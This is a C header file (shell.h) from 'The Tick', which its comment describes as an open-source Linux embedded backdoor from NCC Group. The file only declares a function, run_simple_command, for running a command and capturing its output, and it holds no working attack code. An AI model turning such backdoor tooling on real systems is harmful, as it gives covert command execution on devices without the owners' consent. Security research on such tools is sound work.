/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef SHELL_H
#define SHELL_H

#include <sys/types.h>

int run_simple_command(const char *command, char *buffer, const size_t count);

#endif /* SHELL_H */
